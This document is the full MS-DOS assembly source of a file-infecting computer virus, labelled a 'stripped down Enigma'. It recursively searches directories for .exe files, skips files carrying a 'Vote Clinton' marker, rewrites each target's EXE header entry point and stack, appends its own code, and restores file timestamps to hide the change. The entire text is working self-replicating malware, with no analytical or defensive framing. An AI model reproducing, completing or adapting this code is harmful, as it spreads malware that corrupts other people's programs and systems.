code segment
assume cs:code

;A stripped down Enigma.

data_area	struc			;Define a pattern for working data
					;area
DS_save		dw	?
ES_save		dw 	?
IP_save		dw	?
CS_save		dw	?
SS_save		dw	?
filematch	db	'*.exe',00h	;Names for files to infect
matchall 	db      '*.*',00h	;needed for the matching procedure
infected	dw	00h		;A very useful flag
help_flag	dw	00h		;These two flags are needed to 
where_from_flag dw	00h		;determine if virus is free running
					;or from an infected program
					;therefore it's very important 
					;that where_from_flag value
					;is set to zero at assembly time
handle		dw	?					
ip_old		dw	?		;old instruction pointer
cs_old		dw	?		;old value of code segment
ss_old		dw	?
far_push	dw	?
save_push	dw	?
buffer1		db	'\',63 dup (?)
virus_stamp     db      'Vote Clinton'          ;Very hard to obtain in
						;a random way

question        db      'Press any key to continue...$'
buffer2 	db	2b0h dup (?)
new_area	db	64 dup (?)
new_data	db	64 dup (?)
pointer1	dw	?
pointer2	dw	?
pointer3	dw	?
pointer4	dw	?
pointer5	dw	?
pointer6	dw	?
pointer7	dw	?
pointer8	dw	?

data_area	ends			

	org	100h			;Defined for .com file as virus must
					;be able to run on itself
start:	call	setup_data		;This is a near call therefore it's a
					;three byte instruction.It's purpose is
					;to catch correct data area address 
					;even when virus is appended to the
					;infected .exe program 
adjust	equ	offset pgm_start	;Known offset value  
pgm_start	label	word		;	

virussize	equ	2793
	
 work:  mov	ax,ds			;Save old DS
 	push	cs
	pop	ds			;Update to needed DS value
	mov	si,offset buffer.DS_save  ;Put old DS in a quiet place
	sub	si,adjust
	add	si,bx
	mov	[si],ax
	
 	mov	si,offset buffer.ES_save  ;Save it because Get DTA side effects
 	sub	si,adjust
	add 	si,bx
 	mov	ax,es
	mov	[si],ax
	push	cs			;Imperative because DI usage
	pop	es
	
	push	bx			;It's imperative to always keep
					;this value unchanged
	mov	ax,2f00h		;Get DTA function call
	int	21h
	
	mov	cx,bx			;save address found
	pop	bx
	mov	si,offset buffer.pointer1 
	sub	si,adjust
	add	si,bx
	mov	[si],cx
	add	si,2			;Locate the segment immediately above
	mov	ax,es
	mov	[si],ax				
	push	cs
	pop	es
 
	mov	di,offset buffer.buffer1 ;adjust for first search
	inc	di		         ;Jump over the '\'
	sub	di,adjust
	add	di,bx
	mov	dx,0000h
	push	bx
	call	search_exe
	pop	bx
	mov	si,offset buffer.where_from_flag
	sub	si,adjust
	add	si,bx
	cmp	word ptr [si],0000h
	jnz	infected_run 
	int	020H

infected_run:
	mov	si,offset buffer.pointer1
	sub	si,adjust
	add	si,bx
	mov	dx,[si]
	push	ds
	mov	ax,[si+2]
	mov	ds,ax
	push	bx
	mov	ax,1a00h
	int	21h
	pop	bx
	pop	ds			;Restore original DTA
	
	mov	si,offset buffer.ES_save
	sub	si,adjust
	add	si,bx
	mov	ax,[si]
	mov	es,ax			;Restore ES
	
        call    ask_question

        mov     si,offset buffer.IP_save
	sub	si,adjust
        add     si,bx
	mov	ax,[si]
	mov	dx,[si+2]
	mov	si,offset buffer.far_push	;Restore original code
	sub	si,adjust			;segment
        add     si,bx
	mov	cx,[si]
	push	ax
	mov	ax,cs
	sub	ax,cx
        mov     di,ax                           ;For stack
	add	dx,ax
	pop	ax
	
	mov	si,offset buffer.SS_save
	sub	si,adjust			;Restore stack segment
	add	si,bx
	mov	cx,word ptr [si]
	add	cx,di
	
	push	es
	pop	ds
	
	cli
	mov	ss,cx
	sti
	
	
	push	dx
	push	ax
        ret     far
	

search_exe	PROC

	push	si
	push	dx
	call	transfer_filespec		;transfer filename in another
						;working area
	call	find_first			;try to find a first match
	jc	not_here			;first match not found
	call	try_to_infect			;if found try to infect
						;infected != 0 if success
	mov	si,offset buffer.infected
	sub	si,adjust
	add	si,bx
	test	word ptr [si],0ffffh
	jz	try_next
	jmp	quiet_exit
	
try_next:
	call	find_next			;If infection was not succesful
						;try once more 
	jc	not_here

	call	try_to_infect			;If match found try to infect
      	mov	si,offset buffer.infected	;again
	sub	si,adjust
	add	si,bx
	test	word ptr [si],0ffffh
	jz	try_next

	jmp	quiet_exit			;quiet exit simply jumps
						;to a return instruction
not_here:
	pop	dx				;If first searches are
	push	dx      			;unsuccesful try a '*.*' match
	call	search_all
	call	find_first
	jnc	attribute_test			;i.e. expect probably to
						;find a subdirectory
quiet_exit:
	pop	dx
	pop	si
	ret
	
attribute_test:		
	mov	si,dx				;offset of DTA
	test	byte ptr [si+015h],010h		;where attribute byte is to
						;be found.Try first with 
						;subdirectory attribute
	jne	dir_found			;subdirectory found
more_tries:
	call	find_next			;Since the search was initiated
						;with '*.*' if this is not a
						;directory try to found one
	jc	quiet_exit			;No sense to search more 
	
	test	byte ptr [si+015h],010h
	jz	more_tries			;Search to the end
dir_found:
	cmp	byte ptr [si+01Eh],02Eh 	;Compare with the subdirectory
						;mark '.'
	jz	more_tries			;looking for files no
						;subdirectories

	call	dta_compute			;Valid entry, now set some DTA
						;and continue to search
	push	ax
	mov	ah,01Ah				;Set DTA function call
	int	021h
	pop	ax
	push	si
      	mov	si,offset buffer.infected	
	sub	si,adjust
	add	si,bx
	test	word ptr [si],0ffffh
	pop	si
	jnz	quiet_exit

	jmp	more_tries			


search_exe	ENDP

dta_compute 	PROC

	push	di				;Save some registers
	push	si
	push	ax
	push	bx
	cld					;Up count for SI,DI pair
	mov	si,dx				;DTA address to SI
	add	si,01EH				;and add subdirectory
						;name offset
	
store_loop:
	lodsb	
	stosb	
	or	al,al
	jne	store_loop			;store loop

	std	
	stosb	
	mov	al,05Ch				;Put in place the path name
						;constructor
						
	stosb	
	add	di,2				;Adjust di for new searches
	call	search_exe			;
						;a heavily recursion
						;
	pop	bx				;some cleanup and exit 
						;
	pop	ax
	pop	si
	pop	di
	ret	

dta_compute 	ENDP

try_to_infect 	PROC				

	push	ax
	push	bx
	push	cx
	push	dx
	push	si
	push	di
	
	push	es
	push	bx
	mov	ax,2f00h			;Get DTA function call
	int	21h
	mov	ax,bx
	pop	bx
	mov	si,offset buffer.pointer3
	sub	si,adjust
	add	si,bx
	mov	[si],ax				;Offset saved
	add 	si,2
	mov	ax,es
	mov	[si],ax
	pop	es				;Segment located just above

	mov	dx,offset buffer.new_data
	sub	dx,adjust
	add	dx,bx
	push	bx
	mov	ax,1a00h
	int	21h				;Set DTA function call
	pop 	bx				;It's very important to
						;save BX in all calls

	mov	di,offset buffer.new_area
	mov	si,offset buffer.buffer1
	sub	di,adjust
	sub	si,adjust
	add	di,bx
	add	si,bx
	
	cld					;Move previously found path-
						;name or filename to new
						;data area
move_path:						
	lodsb
	stosb
	or	al,al
	jnz	move_path
	std					;adjust DI to recieve
	mov	al,'\'				;filename.
	mov	cx,0040h
	std					;Search backward
	repne   scasb
	
	mov	si,offset buffer.pointer3
	sub	si,adjust
	add	si,bx
	mov	ax,[si]
	mov	si,ax
	add	di,2				

o_kay:
	add	si,001eh			;The beginning of the
						;filename...
	cld					;Now move name
	 
move_fnm:
	lodsb
	stosb
	or	al,al
	jnz	move_fnm
		 							
	push	dx
	push	bx
	mov	dx,offset buffer.new_area
	sub	dx,adjust
	add	dx,bx
	mov	ax,3d02h			;Open file with handle
						;for read/write
	int	21h
	pop	bx
	pop	dx
	jnc	go_ahead			;In case file cannot be opened
	jmp	error_exit
	
go_ahead:
	mov	si,offset buffer.handle
	sub	si,adjust
	add	si,bx
	mov	[si],ax				;Save handle
	
	push	bx
	mov	bx,ax				;Prepare for lseek
	push	dx
	mov	cx,0000h			;Look at the end of the file
	mov	dx,0000h			;Offset of -12 from the end
						;of the file
	mov	ax,4202h			;Lseek function call
	int	21h
	mov	cx,dx
	pop	dx
	pop	bx
	jnc	compute_length
	jmp	close_error
	
compute_length:

	sub	ax,000ch
	sbb	cx,0000h			;Exact position
	

save_offset:					;	
	mov	si,offset buffer.pointer5
	sub	si,adjust
	add	si,bx
	mov	[si],ax
	add	si,2
	mov	[si],cx
	
	push 	bx
	push	dx
	mov	si,offset buffer.handle
	sub	si,adjust
	add 	si,bx
	mov	bx,[si]
	mov	dx,ax
	mov	ax,4200h			;From beginning of file
	int	21h				;Lseek function call
	pop	dx
	pop	bx
	jnc	set_buffer
	jmp	close_error
		
set_buffer:	
	push	bx
	push	dx
	mov	dx,offset buffer.new_data
	sub	dx,adjust
	add	dx,bx
	mov	si,offset buffer.handle
	sub	si,adjust
	add	si,bx
	mov	bx,[si]				;Load handle
	mov	cx,000ch
	mov	ax,3f00h
	int	21h				;Read function call
	pop	dx
	pop	bx
	jnc	read_ok
	jmp	close_error
	
read_ok:
	mov	si,offset buffer.virus_stamp
	mov	di,offset buffer.new_data
	sub	si,adjust
	sub	di,adjust
	add	si,bx
	add 	di,bx
	mov	cx,12				;Length of strings to
						;compare
	repe	cmpsb
	pushf
      	mov	si,offset buffer.infected	
	sub	si,adjust
	add	si,bx
	mov	word ptr [si],0000h		
	popf
	jnz	infect_it

close_error:
	mov	si,offset buffer.handle
	sub	si,adjust
	add	si,bx
	push	bx
	mov	bx,[si]
	mov	ax,3e00h			;Close file function call
	int	21h
	pop	bx
	jmp	error_exit
	
infect_it:								
      	mov	si,offset buffer.infected	
	sub	si,adjust
	add	si,bx
	mov	word ptr [si],7777h		
	
	mov	si,offset buffer.where_from_flag
	sub	si,adjust
	add	si,bx
	mov	ax,[si]
	sub 	si,2
	mov	[si],ax			;This code effectively moves
					;where_from_flag into help_flag
					
	add	si,2
	mov	[si],5a5ah		;Ready to infect
	push 	bx
	push	dx
	mov	si,offset buffer.handle
	sub	si,adjust
	add 	si,bx
	mov	bx,[si]
	xor	cx,cx
	xor	dx,dx
	mov	ax,4200h			;From beginning of file
	int	21h				;Lseek function call
	pop	dx
	pop	bx
	jnc	set_new_data
	jmp	append_ok
	
set_new_data:
	push	bx
	push	dx
	mov	dx,offset buffer.new_data
	sub	dx,adjust
	add	dx,bx
	mov	si,offset buffer.handle
	sub	si,adjust
	add	si,bx
	mov	bx,[si]				;Load handle
	mov	cx,001bh			;Read formatted exe header
	mov	ax,3f00h
	int	21h				;Read function call
	pop	dx
	pop	bx
	jnc	read_header
	jmp	append_ok

read_header:
	nop					;some code to modify header
						;
			
	mov	si,offset buffer.pointer5
	sub	si,adjust
	add	si,bx
	mov	ax,[si]
	add	si,2
	add	ax,0ch
	adc	word ptr [si],0000h
	sub	si,2
	mov	[si],ax			;This code restores original
					;filelength
			
	mov	si,offset buffer.new_data
	sub	si,adjust
	add	si,bx
	mov	ax,[si]
	cmp	ax,5a4dh		;check for valid exe file
	jz	valid_exe
	jmp	append_ok
	
valid_exe:
	mov	ax,[si+8]		;Load module size
	xor	dx,dx
	shl	ax,1
	rcl	dx,1
	shl	ax,1
	rcl	dx,1
	shl	ax,1
	rcl	dx,1
	shl	ax,1
	rcl	dx,1			;Multiply by 16
	
	push	ax
	push	dx			;Adjust new size
	push	cx
	mov	dx,virussize-896+64
	push	dx
	mov	cx,0009h
	shr	dx,cl
	add	word ptr [si+4],dx
	pop	dx
	and	dx,01ffh
	add	dx,word ptr [si+2]
	cmp	dx,512
	jl	adjust_okay
	sub	dx,512
	inc	word ptr [si+4]
adjust_okay:
	mov	word ptr [si+2],dx	
	pop	cx
	pop	dx
	pop	ax
	

	push	si			;This SI is very useful so save it
							
	mov	si,offset buffer.pointer5
	sub	si,adjust
	add	si,bx
	sub	[si],ax
	mov	ax,[si]
	sbb	[si+2],dx
	mov	dx,[si+2]		;the byte size of the load module
			

	pop	si
	push	ax
	push	dx
	mov	ax,[si+14h]
	mov	dx,[si+16h]		;Get CS:IP value
	mov	cx,[si+0eh]		;Get SS value
	push	si
	mov	si,offset buffer.IP_save
	sub	si,adjust
	add	si,bx
	xchg	[si],ax
	xchg	[si+2],dx
	mov	si,offset buffer.SS_save
	sub	si,adjust
	add	si,bx
	xchg	[si],cx
	mov	si,offset buffer.ip_old
	sub	si,adjust
	add	si,bx
	mov	[si],ax
	mov	[si+2],dx
	mov	si,offset buffer.ss_old
	sub	si,adjust
	add	si,bx
	mov	[si],cx
	pop	si
	pop	dx
	pop	ax
	
	push	ax
	push	dx
	
	shl	ax,1
	rcl	dx,1
	shl	ax,1
	rcl	dx,1
	shl	ax,1
	rcl	dx,1
	shl	ax,1
	rcl	dx,1			;Multiply by 16
	
	mov	cx,0008h
	shl	dx,cl
	mov	cx,0004h
	shr	ax,cl			;A very obscure algorithm to make
					;a segment:offset pair
	mov	[si+14h],ax
	mov	[si+16h],dx		;Infected values

	push	si
	mov	si,offset buffer.far_push
	sub	si,adjust
	add	si,bx
	xchg	[si],dx
	mov	word ptr [si+2],dx
	pop	si
		
	pop	dx
	pop	ax
	add	ax,virussize		;
	adc	dx,0000h

	mov	cx,0003h	
mul_loop:

	shl	ax,1
	rcl	dx,1
	shl	ax,1
	rcl	dx,1
	shl	ax,1
	rcl	dx,1
	shl	ax,1
	rcl	dx,1			;Multiply by 4096
	loop	mul_loop
				
	or	ax,ax
	jz	exact_value
	inc	dx
exact_value:	
	mov	[si+0eh],dx		;Infected stack segment 
		
					;Write back infected header
	push	si
	push	bx
	mov	si,offset buffer.handle
	sub	si,adjust
	add	si,bx
	mov	bx,[si]
	mov	ax,5700h		;Get time function
	int	21h
	pop	bx
	pop	si
	jnc	correct_time
	jmp	append_ok1
	
correct_time:
	push	cx
	push 	bx
	push	dx
	mov	si,offset buffer.handle
	sub	si,adjust
	add 	si,bx
	mov	bx,[si]
	xor	cx,cx
	xor	dx,dx
	mov	ax,4200h			;From beginning of file
	int	21h				;Lseek function call
	pop	dx
	pop	bx
	pop	cx
	jnc	continue_infection
	jmp	append_ok1
	
continue_infection:
	
	push	cx
	push	dx
	push	bx
	mov	dx,offset buffer.new_data
	sub	dx,adjust
	add	dx,bx
	mov	si,offset buffer.handle
	sub	si,adjust
	add	si,bx
	mov	bx,[si]				;Load handle
	mov	cx,001bh			;Write infected exe header
	mov	ax,4000h
	int	21h				;Write function call
	pop	bx
	pop	dx
	pop	cx
	jnc	glue_virus
	jmp	append_ok1

glue_virus:
							
	push	cx
	push 	bx
	push	dx
	mov	si,offset buffer.handle
	sub	si,adjust
	add 	si,bx
	mov	bx,[si]
	xor	cx,cx
	xor	dx,dx
	mov	ax,4202h			;From the end of file
	int	21h				;Lseek function call
	pop	dx
	pop	bx
	pop	cx
	jnc	write_data
	jmp	append_ok1
	
write_data:
	
	mov	si,offset buffer.handle
	sub	si,adjust
	add	si,bx
	
	push	dx
	push	cx
	
	mov	dx,bx
	sub	dx,3				;The starting three byte
						;call instruction
	push	es
	push	bx
	push	dx
	push	si
	mov	ax,2f00h
	int	21h
	pop	si
	pop	dx
	
	push	es
	push	bx
	
	push	si
	mov	ax,1a00h
	int	21h
	pop	si
	
							
	mov	bx,[si]				;Load handle
	mov	cx,virussize-896+64		;Length of virus obtained
	mov	ax,4000h			;with dir
	int	21h
	lahf					;Write function call

	pop	bx
	pop	es
	
	push	ds
	push	es
	pop	ds
	mov	dx,bx
	push	ax
	mov	ax,1a00h
	int	21h
	pop	ax
	
	pop	ds
	pop	bx
	pop	es
	
	pop	cx
	pop	dx
	
	sahf
	jnc	put_stamp			;Error or not file
	jmp	append_ok1			;is closed	
	
put_stamp:
	push	bx
	mov	si,offset buffer.handle
	sub	si,adjust
	add	si,bx
	mov	bx,[si]
	mov	ax,5701h		;Set time function
	int	21h
	pop	bx

append_ok1:

	mov	si,offset buffer.ip_old	;Restore previous CS:IP values
	sub	si,adjust
	add	si,bx
	mov	ax,[si]
	mov	dx,[si+2]
	mov	si,offset buffer.IP_save
	sub	si,adjust
	add	si,bx
	mov	[si],ax
	mov	[si+2],dx	

	mov	si,offset buffer.save_push
	sub	si,adjust
	add	si,bx
	mov	ax,[si]
	mov	word ptr [si-2],ax
	
	mov	si,offset buffer.ss_old
	sub	si,adjust
	add	si,bx
	mov	ax,[si]
	mov	si,offset buffer.SS_save
	sub	si,adjust
	add	si,bx
	mov	word ptr [si],ax
		
		
append_ok:
	mov	si,offset buffer.help_flag
	sub	si,adjust
	add	si,bx
	mov	ax,[si]
	add 	si,2
	mov	[si],ax			;This code effectively moves
					;help_flag into where_from_flag 

		
	jmp	close_error			;
	
error_exit:
	mov	si,offset buffer.pointer3
	sub	si,adjust
	add	si,bx
	mov	dx,[si]			;Restore original DTA
	add	si,2
	mov	ax,[si]
	push	ds
	mov	ds,ax
	mov	ax,1a00h		;Set DTA function call
	int	21h
	pop	ds
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	ret		
	
try_to_infect	ENDP
								
transfer_filespec 	PROC

	push	si
	mov	si,offset buffer.filematch 	;Transfer name to the working
						;area
	sub	si,adjust
	add	si,bx
	call	byte_move
	pop	si
	ret	

transfer_filespec 	ENDP

search_all 	PROC

	push	si
	mov	si,offset buffer.matchall	;This is the '*.*' filename
	sub	si,adjust
	add	si,bx
	call	byte_move
	pop	si
	ret	
	
search_all 	ENDP
	
byte_move	PROC

	push	ax
	push	di

	cld	

move_loop:
	lodsb	
	stosb	
	or	al,al				;The string to move is ASCIIZ
	jne	move_loop
	pop	di
	pop	ax
	ret	
	
byte_move	ENDP
	
find_first	PROC

	push	cx
	push	bx
	cmp	dx,0000h
	jnbe	over_set
	mov	dx,offset buffer.buffer2		;Set Data Transfer Area
	sub	dx,adjust				;or Disk Transfer area
	add	dx,bx					;
over_set:
	add	dx,02Bh
	mov	cx,00010h				;Attribute byte for 
							;directory search
	mov	ah,01ah
	int	021h					;Set DTA function call
	
	pop	bx
	push	bx
	push	dx
	mov	dx,offset buffer.buffer1
	sub	dx,adjust
	add	dx,bx
	mov	ah,04eh				;find first
						;function call
	int	021h
	pop	dx
	pop	bx
	pop	cx
	ret	
	
find_first	ENDP
	
find_next 	PROC

	push	cx
	push	bx
	push	dx
	mov	dx,offset buffer.buffer1
	sub	dx,adjust
	add	dx,bx
	mov	cx,00010h
	mov	ah,04fh				;Find next function call
	int	021h
	pop	dx
	pop	bx
	pop	cx
	ret	

find_next 	ENDP

ask_question    PROC

        mov     dx,offset buffer.question
        mov     ax,09
        int     21h
        xor     ax,ax
        int     16h

ask_question    ENDP


setup_data:
	cli
	pop	bx			;This will catch instruction pointer 
	push	bx	
	sti				;value and after that restore stack
	ret				;pointer value		


buffer	data_area	<>		;Reseve data_area space 	

        code    ends
	END 	start
